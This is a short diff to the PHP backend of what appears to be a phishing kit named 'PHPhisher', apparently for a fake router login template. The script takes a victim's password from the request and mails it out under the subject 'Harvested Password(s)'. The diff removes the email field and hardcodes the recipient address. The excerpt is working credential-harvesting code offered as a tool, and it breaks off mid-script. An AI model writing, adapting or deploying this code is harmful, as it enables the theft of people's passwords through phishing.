@@ -1,12 +1,10 @@
 <?php
 $password = $_GET['password'];
-$email = $_GET['email'];
 
-$subject ="Stolen Credentials";
-$message="Email: $email \nPassword: $password";
+$subject ="Harvested Password(s) (Router_Template)";
+$message="Password: $password";
 $header="from: PHPhisher";
-$json = json_decode(file_get_contents("config.json"), true);
-$to = $json['email'];
+$to ='test@test.com';
 
 if (!$password){
 echo '<script script type="text/javascript">';
